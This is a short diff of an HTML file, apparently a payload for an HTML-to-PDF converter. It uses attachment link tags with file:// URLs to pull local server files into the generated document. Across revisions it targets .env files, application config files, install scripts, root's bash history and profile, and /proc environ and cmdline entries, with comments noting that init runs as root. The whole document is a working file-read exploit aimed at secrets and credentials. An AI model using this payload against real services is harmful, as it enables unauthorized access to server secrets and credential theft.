@@ -5,16 +5,23 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
 </head>
-<!-- <link rel="attachment" href="file:///app.jar"> -->
+<link rel="attachment" href="file:///scripts/init-without-ocr.sh">
 
-<link rel="attachment" href="file:///scripts/init.sh">
+<!-- Check for other scripts in the directory -->
+<link rel="attachment" href="file:///scripts/">
+<link rel="attachment" href="file:///scripts/install_dependencies.sh">
 
+<!-- Application config files at root level -->
+<link rel="attachment" href="file:///application.yml">
+<link rel="attachment" href="file:///application.properties">
+<link rel="attachment" href="file:///.env">
 
-<link rel="attachment" href="file:///root/.bashrc">
+<!-- Configs directory (mounted from host) -->
+<link rel="attachment" href="file:///configs/application.yml">
+<link rel="attachment" href="file:///configs/application.properties">
+
+<!-- Root's bash history (since init runs as root) -->
 <link rel="attachment" href="file:///root/.bash_history">
-
-
-<link rel="attachment" href="file:///proc/9/environ">
-<link rel="attachment" href="file:///proc/9/cmdline">
+<link rel="attachment" href="file:///root/.profile">
 </body>
 </html>
